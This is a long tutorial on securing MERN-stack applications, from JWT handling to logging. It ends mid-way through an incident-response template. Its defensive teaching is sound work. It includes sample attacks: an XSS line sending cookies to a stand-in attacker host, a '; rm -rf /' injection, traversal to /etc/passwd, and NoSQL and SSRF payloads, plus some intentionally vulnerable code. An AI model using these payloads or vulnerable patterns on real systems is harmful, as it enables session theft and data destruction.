# Complete Security Guide for MERN Stack Developers
## From Full Stack Developer to Security Engineer

---

## Table of Contents
1. [Authentication & Authorization](#authentication--authorization)
2. [API Security](#api-security)
3. [Application-Level Attacks & Defense](#application-level-attacks--defense)
4. [Data Security](#data-security)
5. [Node.js Specific Security](#nodejs-specific-security)
6. [React Security](#react-security)
7. [Network Security](#network-security)
8. [Infrastructure & DevOps Security](#infrastructure--devops-security)
9. [Security Testing](#security-testing)
10. [Logging & Monitoring](#logging--monitoring)
11. [Cryptography Fundamentals](#cryptography-fundamentals)
12. [Security Architecture](#security-architecture)
13. [Practical Learning Path](#practical-learning-path)

---

## 1. Authentication & Authorization

### Understanding the Difference
**Authentication** answers "Who are you?" while **Authorization** answers "What can you do?"

### JWT (JSON Web Tokens)
JWTs are the most common authentication mechanism in MERN applications.

**Structure:**
- Header: Algorithm and token type
- Payload: Claims (user data)
- Signature: Verification hash

**Best Practices:**
- Never store sensitive data in JWT payload (it's base64 encoded, not encrypted)
- Use short expiration times (15-30 minutes for access tokens)
- Implement refresh token rotation
- Store JWTs in httpOnly cookies, not localStorage
- Always verify JWT signature on the server
- Use strong secret keys (at least 256 bits)

**Implementation Security:**
```javascript
// Bad - Storing JWT in localStorage
localStorage.setItem('token', jwt);

// Good - Using httpOnly cookie
res.cookie('token', jwt, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 900000
});
```

### Session Management
Sessions store user state on the server side.

**Security Measures:**
- Generate cryptographically random session IDs
- Regenerate session IDs after login
- Implement session timeouts
- Secure session storage (Redis with encryption)
- Use secure, httpOnly, sameSite cookies
- Implement concurrent session limits

### OAuth 2.0 & OpenID Connect
OAuth 2.0 handles authorization, OpenID Connect adds authentication.

**Key Flows:**
- Authorization Code Flow (most secure for web apps)
- PKCE (Proof Key for Code Exchange) for SPAs
- Client Credentials for server-to-server

**Security Considerations:**
- Validate redirect URIs
- Use state parameter to prevent CSRF
- Implement nonce for replay protection
- Secure client secrets
- Validate ID tokens properly

### Password Security
**Hashing Algorithms:**
- **bcrypt**: Industry standard, adaptive cost factor
- **Argon2**: Winner of Password Hashing Competition
- **scrypt**: Memory-hard function

**Never use:** MD5, SHA-1, plain SHA-256 for passwords

**Implementation:**
```javascript
const bcrypt = require('bcrypt');
const saltRounds = 12;

// Hashing
const hashedPassword = await bcrypt.hash(password, saltRounds);

// Verification
const isValid = await bcrypt.compare(password, hashedPassword);
```

### Multi-Factor Authentication (MFA)
**Types:**
- TOTP (Time-based One-Time Password) - Google Authenticator
- SMS (less secure, vulnerable to SIM swapping)
- Hardware tokens (YubiKey)
- Biometric

**Implementation Libraries:**
- speakeasy (TOTP)
- otplib
- node-2fa

### Role-Based Access Control (RBAC)
**Concepts:**
- Users have roles
- Roles have permissions
- Check permissions, not roles in code

**Implementation Strategy:**
```javascript
// Define permissions
const permissions = {
  'user:read': ['admin', 'user', 'guest'],
  'user:write': ['admin'],
  'post:create': ['admin', 'author']
};

// Middleware
function requirePermission(permission) {
  return (req, res, next) => {
    const userRole = req.user.role;
    if (permissions[permission].includes(userRole)) {
      next();
    } else {
      res.status(403).json({ error: 'Forbidden' });
    }
  };
}
```

---

## 2. API Security

### Rate Limiting
Prevents brute force attacks and API abuse.

**Implementation with express-rate-limit:**
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP'
});

app.use('/api/', limiter);
```

**Advanced Strategies:**
- Different limits for different endpoints
- User-based rate limiting (authenticated users get higher limits)
- Distributed rate limiting with Redis
- Sliding window algorithms

### Input Validation & Sanitization
**Never trust user input.**

**Validation Libraries:**
- Joi
- express-validator
- Yup

**Example:**
```javascript
const { body, validationResult } = require('express-validator');

app.post('/user', [
  body('email').isEmail().normalizeEmail(),
  body('age').isInt({ min: 18, max: 120 }),
  body('username').trim().isLength({ min: 3, max: 20 })
    .matches(/^[a-zA-Z0-9_]+$/)
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process validated data
});
```

### CORS (Cross-Origin Resource Sharing)
Controls which domains can access your API.

**Secure Configuration:**
```javascript
const cors = require('cors');

app.use(cors({
  origin: ['https://yourdomain.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400 // Cache preflight for 24 hours
}));
```

**Common Mistakes:**
- Using `origin: '*'` with credentials
- Not validating origin properly
- Allowing all methods

### API Authentication Schemes
**Options:**
- API Keys (simplest, least secure)
- Bearer Tokens (JWT)
- OAuth 2.0
- HMAC Signatures (AWS-style)

**API Key Security:**
```javascript
// Middleware
function apiKeyAuth(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  if (!apiKey || !isValidApiKey(apiKey)) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  next();
}
```

### GraphQL Security
If using GraphQL instead of REST:

**Common Vulnerabilities:**
- Query depth attacks
- Query complexity attacks
- Batching attacks
- Introspection in production

**Protection:**
```javascript
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  schema,
  validationRules: [
    depthLimit(10),
    createComplexityLimitRule(1000)
  ],
  introspection: process.env.NODE_ENV !== 'production'
});
```

### Mass Assignment Protection
Prevent users from updating fields they shouldn't.

**Bad:**
```javascript
app.put('/user/:id', async (req, res) => {
  await User.findByIdAndUpdate(req.params.id, req.body);
});
```

**Good:**
```javascript
app.put('/user/:id', async (req, res) => {
  const allowedFields = ['name', 'email', 'bio'];
  const updates = {};
  allowedFields.forEach(field => {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  });
  await User.findByIdAndUpdate(req.params.id, updates);
});
```

---

## 3. Application-Level Attacks & Defense

### SQL Injection (NoSQL Injection for MongoDB)
**What it is:** Attackers inject malicious queries through input fields.

**MongoDB Example:**
```javascript
// Vulnerable
const user = await User.findOne({ 
  username: req.body.username,
  password: req.body.password 
});

// Attack: {"username": {"$ne": null}, "password": {"$ne": null}}

// Protected
const user = await User.findOne({ 
  username: String(req.body.username),
  password: String(req.body.password)
});

// Better: Use Mongoose schema validation
```

**Prevention:**
- Always use parameterized queries
- Use ORMs/ODMs with built-in protection
- Validate input types
- Implement least privilege for database users

### Cross-Site Scripting (XSS)
**Types:**
1. **Stored XSS**: Malicious script stored in database
2. **Reflected XSS**: Script in URL reflected back
3. **DOM-based XSS**: Client-side script manipulation

**Example Attack:**
```javascript
// User input: <script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

**Prevention:**
- Sanitize all user input
- Use Content Security Policy (CSP)
- Escape output
- Use frameworks that auto-escape (React does this)
- Set httpOnly cookies

**Sanitization Libraries:**
- DOMPurify (client-side)
- sanitize-html (server-side)
- xss

```javascript
const sanitizeHtml = require('sanitize-html');

const clean = sanitizeHtml(dirty, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
  allowedAttributes: {
    'a': ['href']
  }
});
```

### Cross-Site Request Forgery (CSRF)
**What it is:** Attacker tricks user into executing unwanted actions.

**Prevention:**
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/process', csrfProtection, (req, res) => {
  res.send('Protected!');
});
```

**Additional Measures:**
- SameSite cookie attribute
- Check Origin and Referer headers
- Re-authentication for sensitive actions

### Server-Side Request Forgery (SSRF)
**What it is:** Attacker makes server perform requests to unintended locations.

**Example Vulnerability:**
```javascript
// Vulnerable
app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  const response = await fetch(url);
  res.send(await response.text());
});

// Attack: /fetch?url=http://localhost:6379/
```

**Prevention:**
- Whitelist allowed domains
- Disable redirects
- Use DNS resolution checks
- Block private IP ranges

```javascript
const isPrivateIP = (ip) => {
  const parts = ip.split('.').map(Number);
  return parts[0] === 10 ||
    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
    (parts[0] === 192 && parts[1] === 168) ||
    parts[0] === 127;
};
```

### Command Injection
**What it is:** Executing arbitrary system commands.

**Vulnerable Code:**
```javascript
const { exec } = require('child_process');
exec(`ping ${req.query.host}`, callback);
// Attack: ?host=google.com; rm -rf /
```

**Prevention:**
- Never pass user input to shell commands
- Use libraries instead of shell commands
- If necessary, use child_process.execFile with args array
- Validate and sanitize input strictly

### Path Traversal
**What it is:** Accessing files outside intended directory.

**Attack Example:**
```
GET /download?file=../../../../etc/passwd
```

**Prevention:**
```javascript
const path = require('path');

app.get('/download', (req, res) => {
  const filename = req.query.file;
  const safeFilename = path.basename(filename);
  const filepath = path.join(__dirname, 'uploads', safeFilename);
  
  if (!filepath.startsWith(path.join(__dirname, 'uploads'))) {
    return res.status(400).send('Invalid file path');
  }
  
  res.sendFile(filepath);
});
```

---

## 4. Data Security

### Encryption at Rest
**What to encrypt:**
- Personally Identifiable Information (PII)
- Payment information
- Authentication credentials
- Sensitive business data

**Implementation:**
```javascript
const crypto = require('crypto');

class Encryption {
  constructor(key) {
    this.algorithm = 'aes-256-gcm';
    this.key = Buffer.from(key, 'hex');
  }

  encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex')
    };
  }

  decrypt(encrypted, iv, authTag) {
    const decipher = crypto.createDecipheriv(
      this.algorithm,
      this.key,
      Buffer.from(iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}
```

### Encryption in Transit
**Always use HTTPS/TLS.**

**Node.js HTTPS Server:**
```javascript
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('private-key.pem'),
  cert: fs.readFileSync('certificate.pem'),
  minVersion: 'TLSv1.2',
  ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
};

https.createServer(options, app).listen(443);
```

### Key Management
**Best Practices:**
- Never hardcode keys in source code
- Use environment variables or secret management services
- Rotate keys regularly
- Use separate keys for different environments
- Implement key versioning

**Services:**
- AWS KMS (Key Management Service)
- HashiCorp Vault
- Azure Key Vault
- Google Cloud KMS

### Database Security
**MongoDB Security Checklist:**
- Enable authentication
- Use role-based access control
- Enable encryption at rest
- Use TLS for connections
- Disable server-side JavaScript
- Regular backups with encryption
- Keep MongoDB updated
- Bind to localhost or private network

**Connection String Security:**
```javascript
// Bad
const uri = "mongodb://admin:password123@localhost:27017/mydb";

// Good
const uri = process.env.MONGODB_URI;
```

### PII Handling
**Regulations:**
- GDPR (Europe)
- CCPA (California)
- HIPAA (Healthcare)

**Implementation:**
- Data minimization (collect only what you need)
- Pseudonymization and anonymization
- Right to be forgotten (data deletion)
- Data portability
- Audit logging for PII access
- Encryption for PII storage

### Data Masking
**For logs and debugging:**
```javascript
function maskEmail(email) {
  const [name, domain] = email.split('@');
  return `${name[0]}***@${domain}`;
}

function maskCreditCard(number) {
  return `****-****-****-${number.slice(-4)}`;
}

// Logging
logger.info(`User ${maskEmail(user.email)} logged in`);
```

---

## 5. Node.js Specific Security

### npm Security Best Practices
**Package Management:**
- Regularly audit dependencies: `npm audit`
- Use `npm ci` in production
- Check package-lock.json into version control
- Review package before installing
- Use tools like Snyk, npm audit

**Automated Security:**
```bash
# Audit packages
npm audit

# Fix vulnerabilities automatically
npm audit fix

# Check for updates
npm outdated
```

### Dependency Vulnerability Scanning
**Tools:**
- **Snyk**: Continuous monitoring
- **npm audit**: Built-in
- **OWASP Dependency-Check**
- **WhiteSource Bolt**

**Integration:**
```json
// package.json
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "snyk": "snyk test"
  }
}
```

### Prototype Pollution
**What it is:** Modifying Object.prototype affects all objects.

**Vulnerable Code:**
```javascript
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
  return target;
}

// Attack
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
```

**Prevention:**
```javascript
function safeMerge(target, source) {
  for (let key in source) {
    if (source.hasOwnProperty(key) && key !== '__proto__') {
      target[key] = source[key];
    }
  }
  return target;
}

// Or use Object.create(null) for objects without prototype
const obj = Object.create(null);
```

### Avoiding eval() and Unsafe Functions
**Never use:**
- `eval()`
- `Function()` constructor with user input
- `setTimeout()/setInterval()` with string arguments
- `vm.runInNewContext()` with untrusted code

**Alternatives:**
```javascript
// Bad
eval(userInput);

// Good - Use JSON.parse for data
const data = JSON.parse(userInput);

// Good - Use safer alternatives for dynamic code
const func = new Function('a', 'b', 'return a + b');
```

### Error Handling
**Never expose:**
- Stack traces in production
- Database error messages
- Internal paths
- Sensitive configuration

**Secure Error Handling:**
```javascript
app.use((err, req, res, next) => {
  // Log full error server-side
  logger.error(err.stack);
  
  // Send generic error to client
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});
```

### Security Headers
**Essential Headers:**
```javascript
const helmet = require('helmet');

app.use(helmet());

// Or manually:
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});
```

---

## 6. React Security

### Preventing XSS in React
React automatically escapes values, but there are exceptions:

**Dangerous Patterns:**
```javascript
// Dangerous - opens XSS vulnerability
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Dangerous - href javascript
<a href={userInput}>Click</a>

// Dangerous - eval in event handlers
<div onClick={() => eval(userInput)} />
```

**Safe Patterns:**
```javascript
// Safe - React escapes automatically
<div>{userInput}</div>

// Safe - with sanitization
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />

// Safe - validate URL
const isSafeUrl = (url) => {
  return url.startsWith('http://') || url.startsWith('https://');
};
<a href={isSafeUrl(userInput) ? userInput : '#'}>Click</a>
```

### Content Security Policy (CSP)
**Implementation:**
```javascript
// Server-side
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self' https://fonts.gstatic.com; " +
    "connect-src 'self' https://api.yourdomain.com; " +
    "frame-ancestors 'none';"
  );
  next();
});
```

### Secure State Management
**Best Practices:**
- Never store sensitive data in Redux/state if avoidable
- Clear sensitive data on logout
- Use memory-only state for very sensitive data
- Implement proper access control in state updates

```javascript
// Redux reducer with sanitization
function userReducer(state = initialState, action) {
  switch (action.type) {
    case 'SET_USER':
      // Never store password or tokens in state
      const { password, token, ...safeUserData } = action.payload;
      return { ...state, user: safeUserData };
    case 'LOGOUT':
      return initialState;
    default:
      return state;
  }
}
```

### Third-Party Component Security
**Vetting Process:**
- Check npm downloads and popularity
- Review GitHub repository (issues, PRs, last update)
- Check for known vulnerabilities
- Review source code for suspicious patterns
- Use `npm audit` and Snyk

**Security Checklist:**
- Is it actively maintained?
- Does it have security disclosures?
- What permissions does it require?
- Are there safer alternatives?

### Preventing Open Redirects
**Vulnerable:**
```javascript
// After login
const redirect = new URLSearchParams(location.search).get('redirect');
navigate(redirect); // Could redirect to attacker site
```

**Secure:**
```javascript
const redirect = new URLSearchParams(location.search).get('redirect');
const allowedPaths = ['/dashboard', '/profile', '/settings'];

if (allowedPaths.includes(redirect)) {
  navigate(redirect);
} else {
  navigate('/dashboard');
}

// Or validate it's relative
const isRelativeUrl = (url) => {
  return url && url.startsWith('/') && !url.startsWith('//');
};
```

### React Router Security
**Protected Routes:**
```javascript
import { Navigate } from 'react-router-dom';

function ProtectedRoute({ children }) {
  const { user } = useAuth();
  
  if (!user) {
    return <Navigate to="/login" replace />;
  }
  
  return children;
}

// Usage
<Route path="/dashboard" element={
  <ProtectedRoute>
    <Dashboard />
  </ProtectedRoute>
} />
```

---

## 7. Network Security

### HTTPS/TLS Configuration
**Certificate Options:**
- Let's Encrypt (free)
- Commercial CAs (Digicert, etc.)
- Self-signed (development only)

**Best Practices:**
- Use TLS 1.2 or higher
- Strong cipher suites
- Enable HSTS
- Implement certificate pinning for mobile apps
- Regular certificate renewal

**nginx Configuration:**
```nginx
server {
    listen 443 ssl http2;
    server_name yourdomain.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

### HTTP Security Headers
**Complete Header Setup:**
```javascript
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // XSS Protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // HSTS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  
  // Referrer Policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Permissions Policy
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  
  // CSP
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  
  next();
});
```

### DNS Security
**DNSSEC:** Protects against DNS spoofing
**DNS over HTTPS (DoH):** Encrypts DNS queries
**DNS over TLS (DoT):** Encrypts DNS queries

**Implementation:**
- Use reputable DNS providers (Cloudflare, Google)
- Enable DNSSEC on your domain
- Monitor DNS records for unauthorized changes

### DDoS Protection
**Strategies:**
- Rate limiting
- CDN usage (Cloudflare, Akamai)
- Load balancing
- Auto-scaling
- IP blacklisting
- CAPTCHA for suspicious traffic

**Basic Protection:**
```javascript
const rateLimit = require('express-rate-limit');

// Strict limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});

app.post('/login', authLimiter, loginHandler);

// General API limit
const apiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 100
});

app.use('/api/', apiLimiter);
```

### Firewall Configuration
**Web Application Firewall (WAF):**
- AWS WAF
- Cloudflare WAF
- ModSecurity

**Firewall Rules:**
- Block all traffic except necessary ports
- Allow HTTPS (443), HTTP (80)
- SSH (22) only from known IPs
- Block common attack patterns
- Geo-blocking if applicable

---

## 8. Infrastructure & DevOps Security

### Container Security (Docker)
**Dockerfile Best Practices:**
```dockerfile
# Use official, minimal base images
FROM node:18-alpine

# Don't run as root
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001
USER nodejs

# Copy only necessary files
COPY --chown=nodejs:nodejs package*.json ./
RUN npm ci --only=production

COPY --chown=nodejs:nodejs . .

# Expose only necessary ports
EXPOSE 3000

# Use specific versions
CMD ["node", "server.js"]
```

**Security Checklist:**
- Scan images for vulnerabilities (Trivy, Snyk)
- Use multi-stage builds
- Minimize image size
- Don't include secrets in images
- Use read-only file systems when possible
- Implement resource limits

### Kubernetes Security
**Security Contexts:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
```

**Best Practices:**
- Use Network Policies
- Enable RBAC
- Use Pod Security Standards
- Scan images before deployment
- Implement secrets management
- Regular updates
- Audit logs

### CI/CD Pipeline Security
**Security Gates:**
1. **Static Code Analysis** (SonarQube, ESLint)
2. **Dependency Scanning** (npm audit, Snyk)
3. **Secret Scanning** (git-secrets, truffleHog)
4. **Container Scanning** (Trivy, Clair)
5. **SAST** (Semgrep, Checkmarx)
6. **DAST** (OWASP ZAP, Burp)

**GitHub Actions Example:**
```yaml
name: Security Pipeline

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
```

### Secrets Management
**Never store secrets in:**
- Source code
- Environment files in repo
- Docker images
- Logs

**Use:**
- **HashiCorp Vault**: Enterprise secret management
- **AWS Secrets Manager**: AWS-native solution
- **Azure Key Vault**: Azure-native solution
- **Google Secret Manager**: GCP-native solution
- **Doppler**: Multi-cloud secrets management

**Example with AWS Secrets Manager:**
```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret(secretName) {
  const data = await secretsManager.getSecretValue({
    SecretId: secretName
  }).promise();
  
  return JSON.parse(data.SecretString);
}

const dbCreds = await getSecret('prod/db/credentials');
```

### Infrastructure as Code Security
**Terraform Best Practices:**
- Use remote state with encryption
- Implement state locking
- Use modules from trusted sources
- Scan configurations (tfsec, Checkov)
- Implement least privilege IAM
- Enable audit logging

**Example:**
```hcl
# Enable encryption
resource "aws_s3_bucket" "terraform_state" {
  bucket = "my-terraform-state"
  
  versioning {
    enabled = true
  }
  
  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }
}
```

### Cloud Security (AWS/Azure/GCP)
**AWS Security Checklist:**
- Enable MFA for all users
- Use IAM roles, not access keys
- Implement least privilege
- Enable CloudTrail logging
- Use VPC for network isolation
- Enable GuardDuty
- S3 bucket policies (no public access)
- Security Groups (whitelist, not blacklist)
- Regular security audits
- Encryption at rest and in transit

**IAM Policy Example:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:GetObject",
      "s3:PutObject"
    ],
    "Resource": "arn:aws:s3:::my-bucket/*",
    "Condition": {
      "IpAddress": {
        "aws:SourceIp": "203.0.113.0/24"
      }
    }
  }]
}
```

---

## 9. Security Testing

### Penetration Testing
**Phases:**
1. **Reconnaissance**: Information gathering
2. **Scanning**: Finding vulnerabilities
3. **Exploitation**: Attempting to exploit vulnerabilities
4. **Post-exploitation**: Assessing impact
5. **Reporting**: Documenting findings

**Types:**
- **Black Box**: No prior knowledge
- **White Box**: Full knowledge of system
- **Gray Box**: Partial knowledge

### OWASP ZAP (Zed Attack Proxy)
**Automated Scanning:**
```bash
# Install OWASP ZAP
docker pull owasp/zap2docker-stable

# Run automated scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://yourapp.com \
  -r report.html
```

**Manual Testing:**
- Active scanning
- Passive scanning
- Spider/crawler
- Fuzzer
- Authentication testing

### Burp Suite
**Key Features:**
- Proxy intercept
- Scanner (Pro version)
- Intruder (automated attacks)
- Repeater (manual request modification)
- Sequencer (randomness analysis)

**Common Use Cases:**
- Testing authentication
- Finding injection vulnerabilities
- Testing session management
- API security testing

### Static Application Security Testing (SAST)
**Tools:**
- **SonarQube**: Code quality and security
- **Semgrep**: Fast, customizable rules
- **ESLint with security plugins**
- **Checkmarx**: Enterprise solution

**Implementation:**
```javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-child-process': 'error',
    'security/detect-disable-mustache-escape': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error',
    'security/detect-non-literal-fs-filename': 'error',
    'security/detect-non-literal-require': 'error',
    'security/detect-possible-timing-attacks': 'error',
    'security/detect-pseudoRandomBytes': 'error'
  }
};
```

### Dynamic Application Security Testing (DAST)
**Tools:**
- **OWASP ZAP**
- **Burp Suite**
- **Acunetix**
- **Netsparker**

**Advantages:**
- Tests running application
- Finds runtime vulnerabilities
- No source code needed

**Limitations:**
- Can't find all vulnerabilities
- May miss business logic flaws
- Requires running application

### Security Code Review
**What to Look For:**
- Authentication/authorization logic
- Input validation
- SQL/NoSQL queries
- Cryptography implementation
- Error handling
- Logging (ensure no sensitive data)
- Third-party dependencies
- Configuration files

**Review Checklist:**
```markdown
- [ ] Are all inputs validated?
- [ ] Is authentication implemented correctly?
- [ ] Are passwords hashed with strong algorithm?
- [ ] Are database queries parameterized?
- [ ] Is HTTPS enforced?
- [ ] Are error messages generic?
- [ ] Are secrets in environment variables?
- [ ] Is CORS configured properly?
- [ ] Are security headers set?
- [ ] Is rate limiting implemented?
- [ ] Are logs free of sensitive data?
- [ ] Are dependencies up to date?
```

### Vulnerability Assessment
**Process:**
1. Asset identification
2. Vulnerability scanning
3. Risk assessment
4. Remediation prioritization
5. Reporting

**Tools:**
- **Nessus**: Comprehensive vulnerability scanner
- **OpenVAS**: Open-source alternative
- **Qualys**: Cloud-based scanning
- **Rapid7 Nexpose**: Enterprise solution

### Fuzzing
**What it is:** Sending random/malformed data to find crashes and vulnerabilities.

**Tools:**
- **AFL (American Fuzzy Lop)**
- **libFuzzer**
- **Jazzer** (for JavaScript)

**Simple Fuzzing Example:**
```javascript
const fuzzer = require('fuzzer');

function testFunction(input) {
  try {
    // Your function to test
    processUserInput(input);
    return true;
  } catch (e) {
    console.error('Crash found with input:', input);
    console.error('Error:', e.message);
    return false;
  }
}

// Generate and test 10000 random inputs
for (let i = 0; i < 10000; i++) {
  const fuzzedInput = fuzzer.mutate.string(fuzzer.seed.string());
  testFunction(fuzzedInput);
}
```

---

## 10. Logging & Monitoring

### Security Event Logging
**What to Log:**
- Authentication attempts (success/failure)
- Authorization failures
- Input validation failures
- Application errors
- Configuration changes
- Admin actions
- Data access (especially sensitive data)

**What NOT to Log:**
- Passwords
- Session tokens
- Credit card numbers
- Personal data (unless necessary)
- Full stack traces in production

**Implementation:**
```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ 
      filename: 'error.log', 
      level: 'error' 
    }),
    new winston.transports.File({ 
      filename: 'combined.log' 
    }),
    new winston.transports.File({ 
      filename: 'security.log',
      level: 'warn'
    })
  ]
});

// Security events
logger.warn('Failed login attempt', {
  username: req.body.username,
  ip: req.ip,
  timestamp: new Date(),
  userAgent: req.headers['user-agent']
});

logger.info('User authenticated', {
  userId: user.id,
  ip: req.ip,
  timestamp: new Date()
});
```

### Intrusion Detection Systems (IDS)
**Types:**
- **NIDS (Network-based)**: Monitors network traffic
- **HIDS (Host-based)**: Monitors system calls and logs

**Tools:**
- **Snort**: Open-source NIDS
- **Suricata**: Multi-threaded IDS
- **OSSEC**: HIDS
- **Fail2ban**: Blocks IPs after failed attempts

**Fail2ban Configuration:**
```ini
# /etc/fail2ban/jail.local
[nginx-login]
enabled = true
port = http,https
filter = nginx-login
logpath = /var/log/nginx/access.log
maxretry = 5
bantime = 3600
```

### Log Analysis
**Tools:**
- **ELK Stack** (Elasticsearch, Logstash, Kibana)
- **Splunk**: Enterprise log management
- **Graylog**: Open-source alternative
- **Datadog**: Cloud monitoring

**Log Aggregation with Winston + Elasticsearch:**
```javascript
const winston = require('winston');
const { ElasticsearchTransport } = require('winston-elasticsearch');

const logger = winston.createLogger({
  transports: [
    new ElasticsearchTransport({
      level: 'info',
      clientOpts: {
        node: 'http://localhost:9200',
        auth: {
          username: 'elastic',
          password: process.env.ES_PASSWORD
        }
      }
    })
  ]
});
```

### SIEM (Security Information and Event Management)
**Commercial Solutions:**
- Splunk
- IBM QRadar
- ArcSight
- LogRhythm

**Open Source:**
- OSSIM (AlienVault)
- Wazuh
- Security Onion

**Features:**
- Real-time analysis
- Correlation rules
- Alerting
- Compliance reporting
- Threat intelligence

### Anomaly Detection
**Techniques:**
- Statistical analysis
- Machine learning models
- Behavioral analysis
- Threshold-based alerts

**Example with Simple Statistics:**
```javascript
class AnomalyDetector {
  constructor(threshold = 3) {
    this.data = [];
    this.threshold = threshold;
  }

  addDataPoint(value) {
    this.data.push(value);
    if (this.data.length > 100) {
      this.data.shift(); // Keep last 100 points
    }
  }

  isAnomaly(value) {
    if (this.data.length < 10) return false;

    const mean = this.data.reduce((a, b) => a + b) / this.data.length;
    const variance = this.data.reduce((sum, val) => 
      sum + Math.pow(val - mean, 2), 0) / this.data.length;
    const stdDev = Math.sqrt(variance);

    return Math.abs(value - mean) > (this.threshold * stdDev);
  }
}

// Usage for request rate monitoring
const detector = new AnomalyDetector();

app.use((req, res, next) => {
  const currentRate = requestCounter.getRate();
  detector.addDataPoint(currentRate);
  
  if (detector.isAnomaly(currentRate)) {
    logger.warn('Anomalous request rate detected', {
      rate: currentRate,
      ip: req.ip
    });
  }
  
  next();
});
```

### Incident Response
**Phases:**
1. **Preparation**: Plans, tools, training
2. **Detection**: Identifying incidents
3. **Analysis**: Understanding scope
4. **Containment**: Limiting damage
5. **Eradication**: Removing threat
6. **Recovery**: Restoring operations
7. **Post-incident**: Lessons learned

**Incident Response Plan Template:**
```markdown
# Incident Response Plan

## Team Contacts
